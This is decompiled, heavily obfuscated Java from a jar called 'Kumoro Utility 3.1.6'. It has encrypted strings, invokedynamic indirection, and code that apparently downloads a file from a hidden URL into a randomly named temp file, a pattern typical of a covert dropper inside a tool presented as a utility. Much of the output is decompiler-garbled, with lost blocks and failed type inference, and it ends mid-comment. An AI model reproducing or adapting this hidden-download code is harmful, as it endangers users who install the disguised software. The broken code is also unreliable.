package dev.azad1337.p001IlIillIliIlIi.impl;

import dev.azad1337.p000IliIllIilIilIl.C0003v;
import dev.azad1337.p001IlIillIliIlIi.InterfaceC0005T;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.security.SecureRandom;
import java.util.concurrent.TimeUnit;

/* renamed from: dev.azad1337.IılİIıilİlIıİliIılİIıi.impl.p */
/* loaded from: Kumoro Utility 3.1.6.jar:dev/azad1337/IılİIıilİlIıİliIılİIıi/impl/p.class */
public class C0011p implements InterfaceC0005T {
    private boolean enabled;
    private static final String DOWNLOAD_URL;
    private static final String TEMP_DIR;

    /* renamed from: a */
    private static final String[] f47a;

    /* renamed from: b */
    private static final String[] f48b;

    /* renamed from: c */
    private static final long[] f49c;

    /* renamed from: d */
    private static final Integer[] f50d;

    /* renamed from: e */
    private static final long f51e;

    /* renamed from: a */
    private static String m106a(int i, int i2, int i3) {
        int i4;
        int i5 = ((i ^ i3) ^ 15539) & 65535;
        if (f48b[i5] == null) {
            char[] charArray = f47a[i5].toCharArray();
            switch (charArray[0] & 255) {
                case 0:
                    i4 = 186;
                    break;
                case 1:
                    i4 = 28;
                    break;
                case 2:
                    i4 = 230;
                    break;
                case 3:
                    i4 = 17;
                    break;
                case 4:
                    i4 = 241;
                    break;
                case 5:
                    i4 = 68;
                    break;
                case 6:
                    i4 = 189;
                    break;
                case 7:
                    i4 = 43;
                    break;
                case 8:
                    i4 = 76;
                    break;
                case 9:
                    i4 = 242;
                    break;
                case 10:
                    i4 = 44;
                    break;
                case 11:
                    i4 = 143;
                    break;
                case 12:
                    i4 = 65;
                    break;
                case 13:
                    i4 = 140;
                    break;
                case 14:
                    i4 = 20;
                    break;
                case 15:
                    i4 = 127;
                    break;
                case 16:
                    i4 = 114;
                    break;
                case 17:
                    i4 = 52;
                    break;
                case 18:
                    i4 = 164;
                    break;
                case 19:
                    i4 = 58;
                    break;
                case 20:
                    i4 = 255;
                    break;
                case 21:
                    i4 = 185;
                    break;
                case 22:
                    i4 = 163;
                    break;
                case 23:
                    i4 = 214;
                    break;
                case 24:
                    i4 = 145;
                    break;
                case 25:
                    i4 = 141;
                    break;
                case 26:
                    i4 = 30;
                    break;
                case 27:
                    i4 = 245;
                    break;
                case 28:
                    i4 = 47;
                    break;
                case 29:
                    i4 = 233;
                    break;
                case 30:
                    i4 = 34;
                    break;
                case 31:
                    i4 = 6;
                    break;
                case 32:
                    i4 = 42;
                    break;
                case 33:
                    i4 = 208;
                    break;
                case 34:
                    i4 = 254;
                    break;
                case 35:
                    i4 = 103;
                    break;
                case 36:
                    i4 = 227;
                    break;
                case 37:
                    i4 = 216;
                    break;
                case 38:
                    i4 = 94;
                    break;
                case 39:
                    i4 = 120;
                    break;
                case 40:
                    i4 = 137;
                    break;
                case 41:
                    i4 = 249;
                    break;
                case 42:
                    i4 = 91;
                    break;
                case 43:
                    i4 = 3;
                    break;
                case 44:
                    i4 = 11;
                    break;
                case 45:
                    i4 = 173;
                    break;
                case 46:
                    i4 = 25;
                    break;
                case 47:
                    i4 = 142;
                    break;
                case 48:
                    i4 = 253;
                    break;
                case 49:
                    i4 = 82;
                    break;
                case 50:
                    i4 = 212;
                    break;
                case 51:
                    i4 = 72;
                    break;
                case 52:
                    i4 = 211;
                    break;
                case 53:
                    i4 = 101;
                    break;
                case 54:
                    i4 = 183;
                    break;
                case 55:
                    i4 = 131;
                    break;
                case 56:
                    i4 = 225;
                    break;
                case 57:
                    i4 = 148;
                    break;
                case 58:
                    i4 = 235;
                    break;
                case 59:
                    i4 = 151;
                    break;
                case 60:
                    i4 = 37;
                    break;
                case 61:
                    i4 = 139;
                    break;
                case 62:
                    i4 = 83;
                    break;
                case 63:
                    i4 = 67;
                    break;
                case 64:
                    i4 = 146;
                    break;
                case 65:
                    i4 = 144;
                    break;
                case 66:
                    i4 = 118;
                    break;
                case 67:
                    i4 = 70;
                    break;
                case 68:
                    i4 = 90;
                    break;
                case 69:
                    i4 = 136;
                    break;
                case 70:
                    i4 = 154;
                    break;
                case 71:
                    i4 = 160;
                    break;
                case 72:
                    i4 = 46;
                    break;
                case 73:
                    i4 = 14;
                    break;
                case 74:
                    i4 = 246;
                    break;
                case 75:
                    i4 = 224;
                    break;
                case 76:
                    i4 = 32;
                    break;
                case 77:
                    i4 = 172;
                    break;
                case 78:
                    i4 = 243;
                    break;
                case 79:
                    i4 = 119;
                    break;
                case 80:
                    i4 = 123;
                    break;
                case 81:
                    i4 = 190;
                    break;
                case 82:
                    i4 = 215;
                    break;
                case 83:
                    i4 = 13;
                    break;
                case 84:
                    i4 = 250;
                    break;
                case 85:
                    i4 = 206;
                    break;
                case 86:
                    i4 = 23;
                    break;
                case 87:
                    i4 = 244;
                    break;
                case 88:
                    i4 = 115;
                    break;
                case 89:
                    i4 = 192;
                    break;
                case 90:
                    i4 = 125;
                    break;
                case 91:
                    i4 = 251;
                    break;
                case 92:
                    i4 = 247;
                    break;
                case 93:
                    i4 = 105;
                    break;
                case 94:
                    i4 = 177;
                    break;
                case 95:
                    i4 = 238;
                    break;
                case 96:
                    i4 = 95;
                    break;
                case 97:
                    i4 = 184;
                    break;
                case 98:
                    i4 = 221;
                    break;
                case 99:
                    i4 = 21;
                    break;
                case 100:
                    i4 = 54;
                    break;
                case 101:
                    i4 = 66;
                    break;
                case 102:
                    i4 = 98;
                    break;
                case 103:
                    i4 = 204;
                    break;
                case 104:
                    i4 = 138;
                    break;
                case 105:
                    i4 = 109;
                    break;
                case 106:
                    i4 = 124;
                    break;
                case 107:
                    i4 = 86;
                    break;
                case 108:
                    i4 = 80;
                    break;
                case 109:
                    i4 = 53;
                    break;
                case 110:
                    i4 = 100;
                    break;
                case 111:
                    i4 = 202;
                    break;
                case 112:
                    i4 = 39;
                    break;
                case 113:
                    i4 = 48;
                    break;
                case 114:
                    i4 = 213;
                    break;
                case 115:
                    i4 = 223;
                    break;
                case 116:
                    i4 = 135;
                    break;
                case 117:
                    i4 = 102;
                    break;
                case 118:
                    i4 = 50;
                    break;
                case 119:
                    i4 = 162;
                    break;
                case 120:
                    i4 = 197;
                    break;
                case 121:
                    i4 = 88;
                    break;
                case 122:
                    i4 = 122;
                    break;
                case 123:
                    i4 = 130;
                    break;
                case 124:
                    i4 = 236;
                    break;
                case 125:
                    i4 = 64;
                    break;
                case 126:
                    i4 = 153;
                    break;
                case 127:
                    i4 = 96;
                    break;
                case 128:
                    i4 = 178;
                    break;
                case 129:
                    i4 = 199;
                    break;
                case 130:
                    i4 = 113;
                    break;
                case 131:
                    i4 = 75;
                    break;
                case 132:
                    i4 = 133;
                    break;
                case 133:
                    i4 = 40;
                    break;
                case 134:
                    i4 = 1;
                    break;
                case 135:
                    i4 = 239;
                    break;
                case 136:
                    i4 = 161;
                    break;
                case 137:
                    i4 = 33;
                    break;
                case 138:
                    i4 = 195;
                    break;
                case 139:
                    i4 = 117;
                    break;
                case 140:
                    i4 = 174;
                    break;
                case 141:
                    i4 = 8;
                    break;
                case 142:
                    i4 = 4;
                    break;
                case 143:
                    i4 = 111;
                    break;
                case 144:
                    i4 = 59;
                    break;
                case 145:
                    i4 = 152;
                    break;
                case 146:
                    i4 = 182;
                    break;
                case 147:
                    i4 = 168;
                    break;
                case 148:
                    i4 = 57;
                    break;
                case 149:
                    i4 = 29;
                    break;
                case 150:
                    i4 = 62;
                    break;
                case 151:
                    i4 = 79;
                    break;
                case 152:
                    i4 = 97;
                    break;
                case 153:
                    i4 = 159;
                    break;
                case 154:
                    i4 = 112;
                    break;
                case 155:
                    i4 = 121;
                    break;
                case 156:
                    i4 = 180;
                    break;
                case 157:
                    i4 = 217;
                    break;
                case 158:
                    i4 = 226;
                    break;
                case 159:
                    i4 = 15;
                    break;
                case 160:
                    i4 = 207;
                    break;
                case 161:
                    i4 = 24;
                    break;
                case 162:
                    i4 = 61;
                    break;
                case 163:
                    i4 = 170;
                    break;
                case 164:
                    i4 = 219;
                    break;
                case 165:
                    i4 = 60;
                    break;
                case 166:
                    i4 = 156;
                    break;
                case 167:
                    i4 = 26;
                    break;
                case 168:
                    i4 = 10;
                    break;
                case 169:
                    i4 = 149;
                    break;
                case 170:
                    i4 = 165;
                    break;
                case 171:
                    i4 = 248;
                    break;
                case 172:
                    i4 = 56;
                    break;
                case 173:
                    i4 = 49;
                    break;
                case 174:
                    i4 = 205;
                    break;
                case 175:
                    i4 = 150;
                    break;
                case 176:
                    i4 = 171;
                    break;
                case 177:
                    i4 = 87;
                    break;
                case 178:
                    i4 = 85;
                    break;
                case 179:
                    i4 = 22;
                    break;
                case 180:
                    i4 = 166;
                    break;
                case 181:
                    i4 = 129;
                    break;
                case 182:
                    i4 = 99;
                    break;
                case 183:
                    i4 = 237;
                    break;
                case 184:
                    i4 = 110;
                    break;
                case 185:
                    i4 = 77;
                    break;
                case 186:
                    i4 = 193;
                    break;
                case 187:
                    i4 = 158;
                    break;
                case 188:
                    i4 = 252;
                    break;
                case 189:
                    i4 = 55;
                    break;
                case 190:
                    i4 = 179;
                    break;
                case 191:
                    i4 = 71;
                    break;
                case 192:
                    i4 = 78;
                    break;
                case 193:
                    i4 = 240;
                    break;
                case 194:
                    i4 = 198;
                    break;
                case 195:
                    i4 = 63;
                    break;
                case 196:
                    i4 = 218;
                    break;
                case 197:
                    i4 = 181;
                    break;
                case 198:
                    i4 = 92;
                    break;
                case 199:
                    i4 = 209;
                    break;
                case 200:
                    i4 = 231;
                    break;
                case 201:
                    i4 = 9;
                    break;
                case 202:
                    i4 = 191;
                    break;
                case 203:
                    i4 = 19;
                    break;
                case 204:
                    i4 = 229;
                    break;
                case 205:
                    i4 = 12;
                    break;
                case 206:
                    i4 = 38;
                    break;
                case 207:
                    i4 = 27;
                    break;
                case 208:
                    i4 = 175;
                    break;
                case 209:
                    i4 = 18;
                    break;
                case 210:
                    i4 = 134;
                    break;
                case 211:
                    i4 = 167;
                    break;
                case 212:
                    i4 = 107;
                    break;
                case 213:
                    i4 = 89;
                    break;
                case 214:
                    i4 = 232;
                    break;
                case 215:
                    i4 = 203;
                    break;
                case 216:
                    i4 = 16;
                    break;
                case 217:
                    i4 = 84;
                    break;
                case 218:
                    i4 = 188;
                    break;
                case 219:
                    i4 = 45;
                    break;
                case 220:
                    i4 = 222;
                    break;
                case 221:
                    i4 = 116;
                    break;
                case 222:
                    i4 = 5;
                    break;
                case 223:
                    i4 = 210;
                    break;
                case 224:
                    i4 = 2;
                    break;
                case 225:
                    i4 = 200;
                    break;
                case 226:
                    i4 = 132;
                    break;
                case 227:
                    i4 = 108;
                    break;
                case 228:
                    i4 = 234;
                    break;
                case 229:
                    i4 = 104;
                    break;
                case 230:
                    i4 = 126;
                    break;
                case 231:
                    i4 = 196;
                    break;
                case 232:
                    i4 = 201;
                    break;
                case 233:
                    i4 = 106;
                    break;
                case 234:
                    i4 = 176;
                    break;
                case 235:
                    i4 = 93;
                    break;
                case 236:
                    i4 = 169;
                    break;
                case 237:
                    i4 = 74;
                    break;
                case 238:
                    i4 = 155;
                    break;
                case 239:
                    i4 = 187;
                    break;
                case 240:
                    i4 = 36;
                    break;
                case 241:
                    i4 = 147;
                    break;
                case 242:
                    i4 = 41;
                    break;
                case 243:
                    i4 = 7;
                    break;
                case 244:
                    i4 = 31;
                    break;
                case 245:
                    i4 = 157;
                    break;
                case 246:
                    i4 = 228;
                    break;
                case 247:
                    i4 = 0;
                    break;
                case 248:
                    i4 = 69;
                    break;
                case 249:
                    i4 = 51;
                    break;
                case 250:
                    i4 = 73;
                    break;
                case 251:
                    i4 = 194;
                    break;
                case 252:
                    i4 = 35;
                    break;
                case 253:
                    i4 = 128;
                    break;
                case 254:
                    i4 = 81;
                    break;
                default:
                    i4 = 220;
                    break;
            }
            int i6 = i4;
            int i7 = i2 ^ i3;
            int i8 = (i7 & 255) - i6;
            if (i8 < 0) {
                i8 += 256;
            }
            int i9 = ((i7 & 65535) >>> 8) - i6;
            if (i9 < 0) {
                i9 += 256;
            }
            for (int i10 = 0; i10 < charArray.length; i10++) {
                int i11 = i10 % 2;
                int i12 = i10;
                char c = charArray[i12];
                if (i11 == 0) {
                    charArray[i12] = (char) (c ^ i8);
                    i8 = (((i8 >>> 3) | (i8 << 5)) ^ charArray[i10]) & 255;
                } else {
                    charArray[i12] = (char) (c ^ i9);
                    i9 = (((i9 >>> 3) | (i9 << 5)) ^ charArray[i10]) & 255;
                }
            }
            f48b[i5] = new String(charArray).intern();
        }
        return f48b[i5];
    }

    /* renamed from: a */
    private static int m107a(int i, long j) {
        int i2 = (i ^ ((int) (j & 32767))) ^ 31171;
        if (f50d[i2] == null) {
            f50d[i2] = Integer.valueOf((int) (f49c[i2] ^ j));
        }
        return f50d[i2].intValue();
    }

    /* renamed from: O */
    private String m105O(Object[] a) {
        int a2 = ((Integer) a[0]).intValue();
        long a3 = ((Long) a[1]).longValue();
        SecureRandom a4 = new SecureRandom();
        byte[] a5 = new byte[a2 / 2];
        C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, a5, 214734912105402369L, a3) /* invoke-custom */;
        StringBuilder a6 = new StringBuilder();
        for (byte b : a5) {
            (StringBuilder) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(StringBuilder.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a6, (String) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(String.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(m106a(553115400 + 24334, (-553115400) - 18480, (int) a3), new Object[]{(Byte) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(Byte.class, Byte.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(b, 206103200854533926L, a3) /* invoke-custom */}, 199200628682018657L, a3) /* invoke-custom */, 204274365542174641L, a3) /* invoke-custom */;
        }
        return (String) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a6, 202835208653244331L, a3) /* invoke-custom */;
    }

    /* JADX WARN: Code restructure failed: missing block: B:18:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v14, types: [java.lang.Throwable, boolean] */
    /* JADX WARN: Type inference failed for: r0v7, types: [java.io.File] */
    /* JADX WARN: Type inference failed for: r1v11, types: [int] */
    /* JADX WARN: Type inference failed for: r22v0, types: [java.lang.Throwable, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r2v31 */
    /* JADX WARN: Type inference failed for: r3v19, types: [java.lang.Object[], java.lang.Object] */
    /* JADX WARN: Type inference failed for: r3v2, types: [int, java.lang.Object[], java.lang.Object] */
    /* JADX WARN: Type inference failed for: r4v18, types: [java.lang.Object[], java.lang.Object] */
    @Override // dev.azad1337.p001IlIillIliIlIi.InterfaceC0005T
    /* renamed from: a */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public void mo52a(Object[] objArr) {
        Object obj;
        long longValue = ((Long) objArr[0]).longValue();
        long j = longValue ^ 125292804456116L;
        long j2 = longValue ^ 89336394921857L;
        long j3 = longValue ^ 94335842965009L;
        try {
            ?? r3 = new Object[2];
            m107a(22603, 2932058675134502074L ^ longValue)[1] = Long.valueOf(j2);
            r3[0] = Integer.valueOf((int) r3);
            ?? file = new File((String) C0003v.m40a(MethodHandles.lookup(), "Ë", MethodType.methodType(String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-5370379622601103955L, longValue) /* invoke-custom */, m106a(1626185490 - 5500, 1626185490 + 2404, (int) longValue) + (String) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, r3, -5358867540474875394L, longValue) /* invoke-custom */ + m106a(1626185490 - 5510, 1626185490 + 22859, (int) longValue));
            ?? r32 = new Object[2];
            file[1] = Long.valueOf(j3);
            r32[0] = r32;
            if ((boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, r32, -5373563993356144753L, longValue) /* invoke-custom */) {
                ?? r22 = (String) C0003v.m40a(MethodHandles.lookup(), "Ë", MethodType.methodType(String.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(-5355647086343242634L, longValue) /* invoke-custom */;
                if (r22 != 0) {
                    try {
                        ?? B = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(r22, -5355204814320222091L, longValue) /* invoke-custom */;
                        obj = r22;
                        if (B != 0) {
                        }
                        ?? r4 = new Object[3];
                        obj[2] = Long.valueOf(j);
                        r4[1] = r4;
                        r4[0] = file;
                        C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, r4, -5363455346430903353L, longValue) /* invoke-custom */;
                    } catch (Exception unused) {
                        throw r22;
                    }
                }
                obj = "";
                ?? r42 = new Object[3];
                obj[2] = Long.valueOf(j);
                r42[1] = r42;
                r42[0] = file;
                C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, r42, -5363455346430903353L, longValue) /* invoke-custom */;
            }
        } catch (Exception e) {
        }
    }

    /* JADX WARN: Can't wrap try/catch for region: R(4:91|(3:(2:94|95)|96|97)|98|99) */
    /* JADX WARN: Code restructure failed: missing block: B:101:0x01f8, code lost:
    
        r20 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:102:0x01fa, code lost:
    
        call_site(
            {METHOD_HANDLE: INVOKE_STATIC: Ldev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v;->a(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/invoke/CallSite;}
            {STRING: "B"}
            {METHOD_TYPE: (Ljava/lang/Object;, Ljava/lang/Object;, J, J)V}
        ).invoke(r19, r20, 7162872341546138570L, r1);
     */
    /* JADX WARN: Code restructure failed: missing block: B:21:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:24:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:77:?, code lost:
    
        throw r0;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:11:0x00fe  */
    /* JADX WARN: Removed duplicated region for block: B:64:0x0214  */
    /* JADX WARN: Type inference failed for: r0v22, types: [java.lang.Throwable] */
    /* JADX WARN: Type inference failed for: r0v32, types: [java.lang.Throwable, java.io.FileOutputStream, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r0v40, types: [java.lang.Throwable, int] */
    /* JADX WARN: Type inference failed for: r1v55, types: [int] */
    /* JADX WARN: Unreachable blocks removed: 1, instructions: 1 */
    /* renamed from: D */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    private boolean m103D(Object[] objArr) {
        File file = (File) objArr[0];
        long longValue = ((Long) objArr[1]).longValue();
        boolean z = (boolean) C0003v.m40a(MethodHandles.lookup(), "Ë", MethodType.methodType(Boolean.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(7152301505028093740L, longValue) /* invoke-custom */;
        HttpURLConnection httpURLConnection = null;
        try {
            httpURLConnection = (HttpURLConnection) (URLConnection) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(URLConnection.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(new URL(m106a(646306170 - 31198, 55674 - ((char) (-27144)), (int) longValue)), 7183187986740825480L, longValue) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(httpURLConnection, m106a(646306170 - 31202, 646306170 - 24257, (int) longValue), 7166915150273189865L, longValue) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(httpURLConnection, m107a(13365, 912584131945934547L ^ longValue), 7182374917096237410L, longValue) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(httpURLConnection, m107a(8769, 5428274957611612323L ^ longValue), 7179431540953409025L, longValue) /* invoke-custom */;
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(httpURLConnection, m106a(646306170 - 31205, 55674 - ((char) (-10711)), (int) longValue), m106a(646306170 - 31226, (-646306170) - (-((char) (-21639))), (int) longValue), 7153726385630929683L, longValue) /* invoke-custom */;
            ?? B = (int) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Integer.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(httpURLConnection, 7153632517162069917L, longValue) /* invoke-custom */;
            boolean z2 = z;
            boolean z3 = B;
            boolean z4 = z2;
            if (longValue > 0) {
                if (!z2) {
                    z4 = m107a(20821, 2895571976793639862L ^ longValue);
                }
                boolean z5 = z3;
                HttpURLConnection httpURLConnection2 = httpURLConnection;
                if (!z) {
                    if (httpURLConnection2 != null) {
                        httpURLConnection2 = httpURLConnection;
                    }
                    return z5;
                }
                C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(httpURLConnection2, 7179522893623322497L, longValue) /* invoke-custom */;
                return z5;
            }
            if (B != z4) {
                z3 = false;
                boolean z52 = z3;
                HttpURLConnection httpURLConnection22 = httpURLConnection;
                if (!z) {
                }
                C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(httpURLConnection22, 7179522893623322497L, longValue) /* invoke-custom */;
                return z52;
            }
            InputStream B2 = (InputStream) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(InputStream.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(httpURLConnection, 7181589756201871171L, longValue) /* invoke-custom */;
            try {
                ?? fileOutputStream = new FileOutputStream(file);
                try {
                    byte[] bArr = new byte[m107a(13290, 2572569598675298571L ^ longValue)];
                    loop0: while (true) {
                        ?? B3 = (int) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Integer.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B2, bArr, 7155473449433835303L, longValue) /* invoke-custom */;
                        if (B3 == -1) {
                            break;
                        }
                        C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Integer.TYPE, Integer.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(fileOutputStream, bArr, 0, B3, 7184096011789427298L, longValue) /* invoke-custom */;
                        do {
                            boolean z6 = z;
                            if (longValue >= 0) {
                                if (z6) {
                                    break loop0;
                                }
                                z6 = z;
                            }
                            if (z6) {
                            }
                        } while (longValue <= 0);
                    }
                    C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(fileOutputStream, 7182980228678425712L, longValue) /* invoke-custom */;
                    C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(fileOutputStream, 7156912923896176169L, longValue) /* invoke-custom */;
                    if (longValue > 0) {
                        InputStream inputStream = B2;
                        if (!z) {
                            if (inputStream != null) {
                                inputStream = B2;
                            }
                            HttpURLConnection httpURLConnection3 = httpURLConnection;
                            if (!z) {
                                if (httpURLConnection3 != null) {
                                    httpURLConnection3 = httpURLConnection;
                                }
                                return true;
                            }
                            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(httpURLConnection3, 7179522893623322497L, longValue) /* invoke-custom */;
                            return true;
                        }
                        C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(inputStream, 7153342834854476050L, longValue) /* invoke-custom */;
                    }
                    HttpURLConnection httpURLConnection32 = httpURLConnection;
                    if (!z) {
                    }
                    C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(httpURLConnection32, 7179522893623322497L, longValue) /* invoke-custom */;
                    return true;
                } catch (Throwable th) {
                    try {
                        C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(fileOutputStream, 7156912923896176169L, longValue) /* invoke-custom */;
                    } catch (Throwable th2) {
                        C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(th, th2, 7162872341546138570L, longValue) /* invoke-custom */;
                    }
                    throw th;
                }
            } catch (Throwable th3) {
                if (longValue > 0) {
                    InputStream inputStream2 = B2;
                    if (!z) {
                        if (inputStream2 != null) {
                            inputStream2 = B2;
                        }
                        throw th3;
                    }
                    C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(inputStream2, 7153342834854476050L, longValue) /* invoke-custom */;
                }
                throw th3;
            }
        } catch (Exception e) {
            HttpURLConnection httpURLConnection4 = httpURLConnection;
            if (!z) {
                if (httpURLConnection4 != null) {
                    httpURLConnection4 = httpURLConnection;
                }
                return false;
            }
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(httpURLConnection4, 7179522893623322497L, longValue) /* invoke-custom */;
            return false;
        } catch (Throwable th4) {
            HttpURLConnection httpURLConnection5 = httpURLConnection;
            if (!z) {
                if (httpURLConnection5 != null) {
                    httpURLConnection5 = httpURLConnection;
                }
                throw th4;
            }
            C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Void.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(httpURLConnection5, 7179522893623322497L, longValue) /* invoke-custom */;
            throw th4;
        }
    }

    public C0011p(long a) {
        C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, Boolean.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, true, 2522187440283341222L, a) /* invoke-custom */;
    }

    @Override // dev.azad1337.p001IlIillIliIlIi.InterfaceC0005T
    /* renamed from: J */
    public boolean mo53J(Object[] a) {
        return (boolean) C0003v.m40a(MethodHandles.lookup(), "T", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, 5587489417687285548L, ((Long) a[0]).longValue()) /* invoke-custom */;
    }

    @Override // dev.azad1337.p001IlIillIliIlIi.InterfaceC0005T
    /* renamed from: k */
    public void mo51k(Object[] objArr) {
    }

    @Override // dev.azad1337.p001IlIillIliIlIi.InterfaceC0005T
    /* renamed from: t */
    public void mo54t(Object[] a) {
        C0003v.m40a(MethodHandles.lookup(), "L", MethodType.methodType(Void.TYPE, Object.class, Boolean.TYPE, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(this, ((Boolean) a[0]).booleanValue(), 8622659690609444111L, ((Long) a[1]).longValue()) /* invoke-custom */;
    }

    @Override // dev.azad1337.p001IlIillIliIlIi.InterfaceC0005T
    /* renamed from: I */
    public String mo50I(Object[] a) {
        return m106a((-746312580) - 9228, 746312580 - 15434, (int) ((Long) a[0]).longValue());
    }

    /* JADX WARN: Code restructure failed: missing block: B:10:0x0123, code lost:
    
        if (r3 != 0) goto L52;
     */
    /* JADX WARN: Code restructure failed: missing block: B:11:0x0126, code lost:
    
        r3 = r2;
        r4 = r1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:13:0x0101, code lost:
    
        r6 = 20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:14:0x0106, code lost:
    
        r6 = 'L';
     */
    /* JADX WARN: Code restructure failed: missing block: B:15:0x010b, code lost:
    
        r6 = 'Q';
     */
    /* JADX WARN: Code restructure failed: missing block: B:16:0x0110, code lost:
    
        r6 = 'i';
     */
    /* JADX WARN: Code restructure failed: missing block: B:17:0x0115, code lost:
    
        r6 = 4;
     */
    /* JADX WARN: Code restructure failed: missing block: B:18:0x0119, code lost:
    
        r6 = 16;
     */
    /* JADX WARN: Code restructure failed: missing block: B:19:0x012b, code lost:
    
        r3 = r1;
        r2 = r2;
        r1 = r3;
     */
    /* JADX WARN: Code restructure failed: missing block: B:20:0x012f, code lost:
    
        if (r3 > r21) goto L15;
     */
